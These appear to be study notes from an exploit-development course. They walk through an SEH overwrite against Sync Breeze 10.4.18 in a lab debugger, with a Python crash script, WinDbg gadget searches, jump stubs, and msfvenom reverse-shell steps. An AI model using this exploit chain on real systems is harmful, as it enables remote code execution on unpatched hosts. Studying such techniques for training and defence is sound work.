#### Structured Exception Handling (SEH)

Whereas buffer overflows are simply handled through stack memory and the EIP, SEH (and other overflows) use other exploitable structures and pointers to get code execution.
An example being the Windows exception-handling structure, which can be demonstrated in 10.4.18 of Sync Breeze

1. Crash the Application 
2. Control EIP 
3. Make Space for Shellcode 
4. Check Bad Characters 
5. Find a Return Instruction 
6. Jump to ESP 
7. Generate Shellcode

## Crash the Application
Provided POC script: crafts a custom protocol header with a large buffer
```
#!/usr/bin/python
import socket
import sys
from struct import pack

try:
  server = sys.argv[1]
  port = 9121
  size = 1000

  inputBuffer = b"\x41" * size

  header =  b"\x75\x19\xba\xab"
  header += b"\x03\x00\x00\x00"
  header += b"\x00\x40\x00\x00"
  header += pack('<I', len(inputBuffer))
  header += pack('<I', len(inputBuffer))
  header += pack('<I', inputBuffer[-1])

  buf = header + inputBuffer 

  print("Sending evil buffer...")
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s.connect((server, port))
  s.send(buf)
  s.close()
  
  print("Done!")
  
except socket.error:
  print("Could not connect!")

```
- Attach Windbg on Sync Breeze in the VM and run the script
- The process crashes and we see an access violation, EAX has been overwritten as `eax=41414141`. The program tries to deference a pointer value from the EAX register and crashes

## Analyzing the Crash
- The program tries to reach a location at offset 0x24 from the EAX, which is out of program memory, `call dword ptr [eax+24h]`
- EIP is still not overflowed, but if we print the values on the stack with `dds esp L30`, we see that some values did make their way to registers, but none loaded to EIP.
- press `g` to continue execution, and we get a new crash, which shows EIP has been overflowed into
- The first error handler was a 'first chance exception' which is a notification that an unexpected event occurred during execution

## Intro to SEH
**Hardware exceptions** are initiated by the CPU. We encountered a typical hardware exception when our script crashed the Sync Breeze service as the CPU attempted to dereference an invalid memory address.

**Software exceptions** are explicitly initiated by applications when the execution flow reaches unexpected or unwanted conditions. For example, a software developer raises an exception (try/except) in their code to signal a function could not execute normally because of an invalid input argument.

> A software exception raised in code will leverage the SEH (Structure Exception Handling) mechanism in Windows OS. Every time a try block is encountered in the execution of the thread, a pointer to the corresponding exception handler is stored on the stack in a linked list. The last node (last resort handler) is a default exception handler that will kill the thread

![[Pasted image 20230602154707.png]]
Structured exception handling works on a per-thread level, each thread is identified by the Thread Environment Block (TEB) which stores info related to each thread.

`dt nt!_TEB` starts with nested structure -> 
`dt _NT_TIB` contains a pointer (called `ExceptionList`) to -> 
`dt _EXCEPTION_REGISTRATION_RECORD` (ERR) which contains a pointer to the next ERR and to an `EXCEPTION_DISPOSITION` returned by ->
`_except_handler` with parameters `EstablisherFrame` (points back to the calling ERR) and `ContextRecord` (points to a structure containing register state at time of the exception)
`dt ntdll!_CONTEXT` dumps -> register information

> The information in `ContextRecord` is important as it will be used to restore execution state after the exception has been handled

`dt _EXCEPTION_DISPOSITION` -> return results from exception handling, `ExceptionContinueExecution` = exception can be handled here, `ExceptionContinueSearch` = exception couldn't be handled

``
## SEH Validation

`_ntdll!KiUserExceptionDispatcher` (called on exception) CALLS -> `RtlDispatchException` (previous process) AND `_RtlIsValidHandler` (additional validity checks`)
`_RtlIsValidHandler` CALLS (on successful validation) ->`_RtlpExecuteHandlerForException` CALLS ->  `ExecuteHandler`

- `_ntdll!KiUserExceptionDispatcher` - responsible for dispatching exceptions on Windows operating systems. It eventually calls `_RtlDispatchException` which retrieves the TEB and does the previous process.
	For each Handler member, the OS will check to see if the `_EXCEPTION_REGISTRATION_RECORD` used is within the stack memory limits of the TEB
- `_RtlIsValidHandler` includes SafeSEH and SEHOP (default only on Windows server) 
- `_RtlpExecuteHandlerForException` sets up the appropriate arguments and invokes `ExecuteHandler`. As the name suggests, this native API is responsible for calling the `_except_handler `functions registered on the stack.


### Protections

- SafeSEH - modules compiled with it produce an image containing a table of safe exception handlers (to prevent injected handlers)
- Structured Exception Handler Overwrite Protection (SEHOP) - validates the `_EXCEPTION_REGISTRATION_RECORD` list chain before invoking them
- GS - the EBP is XOR'd with a cookie before execution and saved in .data, then checked again before returning. However, this can be bypassed by overwriting a EXCEPTION_REGISTRATION_RECORD since the function will never reach its return.


psuedo-code implementation of  `_RtlIsValidHandler` : 
```
BOOL RtlIsValidHandler(Handler) // NT 6.3.9600
  {
        if (/* Handler within the image */) {
            if (DllCharacteristics->IMAGE_DLLCHARACTERISTICS_NO_SEH)
                goto InvalidHandler;
            if (/* The image is .Net assembly, 'ILonly' flag is enabled */)
                goto InvalidHandler;
            if (/* Found 'SafeSEH' table */) {
                if (/* The image is registered in 'LdrpInvertedFunctionTable' (or its cache), or the initialization of the process is not complete */) {
                    if (/* Handler found in 'SafeSEH' table */)
                        return TRUE;
                    else
                        goto InvalidHandler;
                }
            return TRUE;
        } else {
            if (/* 'ExecuteDispatchEnable' and 'ImageDispatchEnable' flags are enabled in 'ExecuteOptions' of the process */)
                return TRUE;
            if (/* Handler is in non-executable area of the memory */) {
                if (ExecuteDispatchEnable) return TRUE;
            }
            else if (ImageDispatchEnable) return TRUE;
        }
        InvalidHandler:
            RtlInvalidHandlerDetected(...);
            return FALSE;
  }
```



# Sync Breeze SEH Overflow Example

The intent is to overflow the stack buffer into overwriting a valid registered exception handler. Then, we can get control of the instruction pointer after triggering an exception. 


## Inspect Intact Chain

1. `!teb` : shows memory address of current threads' TEB and sub-structures, including ExceptionList
2. `dt _EXCEPTION_REGISTRATION_RECORD 01d8ff70` : dumps structure data at memory address (listed by previous command)
	- Do this 3 times, using the `Next` value to find next Record, finally getting to the terminating Exception which has a Next of `0xffffffff`


## Inspect Exploit's Chain

1. Run Sync Breeze with `g`, and run exploit
2. Perform the same steps as last stage
	- We find that the second Record has been overwritten by the exploit (and thus its Next value is unusable) causing another access violation when ran.
	- `!exchain` : display exception handlers of the current thread, by default it shows the SEH mechanism handlers. Does what we did above, but condensed.
		```
		0:011> !exchain
		01c4fe1c: libpal!md5_starts+149fb (00b3df5b)
		01c4ff54: 41414141
		Invalid exception stack at 41414141
		```
>	Records are pushed on stack from first to last, so generally the last Record structure in the list structure (besides the default Record) will be first one overwritten.
3. `k` : to dump callstack, showing that `ntdll!ExecuteHandler2`, which calls `_except_handler` was called just before our EIP overflow
4. `r` : to display registers, and `dds REGISTER L10` to dump each register, checking to see if we can access our buffer space with a register. We cannot :(
5. restart SyncBreeze and `bp ntdll!ExecuteHandler2`, then run program until breakpoint reached. `g` : to continue, since this is only the first call (from the non-overwritten Record), then we reach the breakpoint again for the overwritten Record. 
6. `u eip L10` : to unassemble memory at EIP:
	```
	0:008> u @eip L11
	ntdll!ExecuteHandler2:
	770a3adc 55              push    ebp
	770a3add 8bec            mov     ebp,esp
	770a3adf ff750c          push    dword ptr [ebp+0Ch]
	770a3ae2 52              push    edx
	770a3ae3 64ff3500000000  push    dword ptr fs:[0]
	770a3aea 64892500000000  mov     dword ptr fs:[0],esp
	770a3af1 ff7514          push    dword ptr [ebp+14h]
	770a3af4 ff7510          push    dword ptr [ebp+10h]
	770a3af7 ff750c          push    dword ptr [ebp+0Ch]
	770a3afa ff7508          push    dword ptr [ebp+8]
	770a3afd 8b4d18          mov     ecx,dword ptr [ebp+18h]
	770a3b00 ffd1            call    ecx
	770a3b02 648b2500000000  mov     esp,dword ptr fs:[0]
	770a3b09 648f0500000000  pop     dword ptr fs:[0]
	770a3b10 8be5            mov     esp,ebp
	770a3b12 5d              pop     ebp
	770a3b13 c21400          ret     14h
	```
	- we see 4 pushes and a call to ECX, inferring a call to `_except_handler`
7. `t` : to step into instruction and follow the execution of `ntdll!ExecuteHandler2`
	1. First (770a3adc and 770a3add), EBP is put on the stack, and ESP value is moved to EBP (to easily access the arguments passed to `ntdll!ExecuteHandler2` )
	2. First push instruction: `t` -> `!teb` -> `dt ...ERR ADDRESS` (same steps as above), we see that the value in Next is being pushed onto the stack
	3. Second push instruction: `t` -> `u edx`, we see it places a position onto the stack that is offset 0x44 into `ntdll!ExecuteHandler2`
	4. Third push instruction: `t` -> `!teb`, we see it places the pointer to ExceptionList (to a RECORD) onto the stack
	5. Move instruction: this will overwrite the current ExceptionList with the value of ESP
8. In summary, before the parameters for `_except_handler` are pushed, the OS updates ExceptionList with a new RECORD structure which will handle any new exceptions that might occur during `_except_handler` execution. The function to handle this is stored in EDX before `ntdll!ExecuteHandler2` is called.
9. Step through with `t` until we get to `call ecx`, which is where our overflow (causing another exception) occurs.

`_except_handler` prototype:
```
typedef EXCEPTION_DISPOSITION _except_handler (*PEXCEPTION_ROUTINE) (  
    IN PEXCEPTION_RECORD ExceptionRecord,  
    IN VOID EstablisherFrame,
    IN OUT PCONTEXT ContextRecord, 
    IN OUT PDISPATCHER_CONTEXT DispatcherContext  
); 
```

## Gaining Code Execution

In traditional buffer overflow, we would have stack control and EIP control at the same time. In this case, we don't control EIP until after we lose stack control through exception calls (and their stack allocations).
But, we do know that when our bad Handler is called, the stack will contain a return address and four `_except_handler` arguments.

>	The 2nd argument is an `EstablisherFrame`, which points back to the `_EXCEPTION_REGISTRATION_RECORD` used to handle the exception. This points to our controlled section of the stack.

We need to exploit the crash-time handler address (which currently control) to point to an instruction that returns into the `EstablisherFrame` address on the stack. 

- **DESIRED EXPLOIT FLOW:** Overflowed ERR contains -> Handler, points to -> (dll instruction) `POP R32, POP 32, RET` (to `EstablisherFrame`), jumps to -> Controlled stack address space
	- `POP R32, POP 32, RET` can pop out 2 values on stack (placed over top our desired value), then return to the address stored in ExceptionRecord. We'll find that instruction location in a later step
1. Determine exact offset for the exception Handler overwrite with `msf-pattern_create`
2. Run exploit until params for the 2nd handler are loaded
3. `msf-pattern_offset` on bytes found in `EstablisherFrame`
4. Edit script buffer with identifiable bytes to overflow `EstablisherFrame` address location


## Detecting Bad Characters

>Similar process to what we did for the simpler buffer overflow example.

1. Create a string of all hex characters (`\x01 - \xff`) in the exploit code
2. Input this string into the buffer, after the section for EIP control
3. Run the exploit against the service, skip the first error.
4. `dds esp L5` to show values currently pushed to the stack (which we established that at this time will be the return address, and arguments for `_except_handler`)
5. `db ADDRESS` of the third stack value, which is `EstablisherFrame`'s passed value, to view the hex characters passed to the buffer space
6. The buffer will stop being written when it hits an invalid character, remove this from the exploit and restart the process


## Finding a P/P/R Instruction Sequence

`pop 32, pop 32, ret` is needed since there are two values loaded on top of `EstablisherFrame`'s value on the stack. However, many modules will have protections that prevent this kind of exploitation. Instead of browsing manually to find insecure modules, we can use tools.

[[WinDbg]] `narly` extension will generate a list of all loaded modules and their protections.

1. `.load narly`, `!nmod` : outputs SafeSEH, GS, DEP, and ASLR info for loaded modules. Find any that are missing SafeSEH, etc. In this case, libspp.dll is unsafe and loaded in space which doesn't use null bytes (`0x00`)
2. Search that module forli a sequence of `pop 32, pop 32, ret` instructions, due to it being a string of instructions its best to script out this logic in a WinDbg "classic" script (vs. using `s` to search manually)
	1. `lm m libspp` : to get address range of the libspp.dll module
	2. Use `msf-nasm_shell` to generate opcodes for desired instructions
		- `pop eax, pop ebx, pop ecx, pop edx, pop esi, pop edi, pop ebp` : generate opcodes for our pop instructions, this comes out to the range `0x58 - 0x5F`
			- `pop esp` doesn't work because it will disrupt the top of our stack, where we need to be returning from
		- `ret` : for the return, obviously. Script below:
			https://learn.microsoft.com/en-us/windows-hardware/drivers/debugger/s--search-memory- : for explanation on s -\[1\]b
```
.block { 
	.for (r $t0 = 0x58; $t0 < 0x5F; r $t0 = $t0 + 0x01) { 
		.for (r $t1 = 0x58; $t1 < 0x5F; r $t1 = $t1 + 0x01) { 
			s-[1]b 10000000 10226000 $t0 $t1 c3 
		} 
	} 
}
```
3. Run script from WinDbg with `$><C:\Users\offsec\Desktop\SCRIPT_NAME.wds`, pick a result that doesn't contain any bad chars, and confirm the instructions with `u ADDRESS L3`
4. Insert the chosen address into the exploit script in the EIP portion of the buffer. 
	- `inputBuffer += pack("<L", (ADDRESS))` 
5. Run the process and exploit, set a breakpoint at the address of the instructions, then step two instructions `t,t`, and confirm ESP points to our controlled buffer space with `db poi(esp)`
	- Optionally, before hitting the breakpoint, `!exchain` to see the injected address loaded as the 2nd exception handler and `u ADDRESS L3` to unassemble the instructions at that location


## Island-Hopping

At this point ESP will point to a stack location just BEFORE the pointer to our `pop 32, pop 32, ret` address. This means the EIP will eventually read that stack data and try to execute it as an instruction, which will be a gibberish instruction to an out of scope address, causing another error.
Luckily we also control the few bytes of memory before that happens and can perform a relative jump or...
#### Short Jump
1. `bp P/P/R_ADDRESS`, then run the program.
2. Step through from the breakpoint until we hit the Next section of the ERR where we will assemble a jump
3. `dds eip L4` : viewing the upcoming P/R/R address (which will be read as a LOCK instruction), `a` -> `jmp ADDRESS_AFTER_P/R/R`, this will assemble an instruction at the current location to the address listed, but using relative memory locations, skipping the undesired LOCK instruction (press Ctrl+Enter to exit `a` Input> mode)
4. Write jump into the exploit code before the P/R/R address. `input_buffer += 909006eb` : a jump of 6 bytes, followed by two NOPs
5. Run the program again and ensure you've landed in the space immediately after the P/R/R.
But this space is very close to the StackBase, and therefore doesn't give us enough room for shellcode. But it gives us enough room to try an...
#### Island-Hop
1. In the exploit, add a distinctive shellcode buffer into the inputBuffer. ```
```
shellcode = b"/x43" * 400 
... 
inputBuffer += b"/x90" * (size - len(inputBuffer) - len(shellcode))
inputBuffer += shellcode
```
2. Rerun the exploit and run a search, looking for this distinctive sequence between the NOP space and the beginning of the shellcode. `s -b STACKLIMIT STACKBASE 90 90 90 90 43 43 43 43`. This returns the address where the pattern is found.
3. Ensure the shellcode isn't truncated. `dd PATTERN_ADDR L100`
4. Calculate the difference between EIP and the shellcode start address, we'll use EIP's current location as our jumping off point. `? PATTERN_ADDR - @esp`
5. Then create the appropriate add and jump instruction with msf-nasm_shell. `nasm > add esp, DIFFERENCE(HEX)`, and `nasm > jmp esp`
	1. This give an instruction with bad chars (nulls), but we can do an addition of just the lower bits to get an instruction that works. `nasm add sp, DIFFERENCE(HEX)`
6. Add these instructions to the exploit (context specific example below)
```
...
inputBuffer+= b"\x66\x81\xc4\x30\x08" # add sp, 0x830 inputBuffer+= b"\xff\xe4" # jmp esp
...
```
7. Run the exploit again and step through the ESP add and jump, ensure we land at the beginning of the shellcode


## Obtaining a Shell
You know this
`msfvenom -p windows/...`, declaring bad chars to avoid in encoding
increase NOP sled in beginning of shellcode to give the encoder some space to work
insert bytecodes from msfvenom output into the exploit
Run a listener and try the exploit
get a shell -> profit!!!!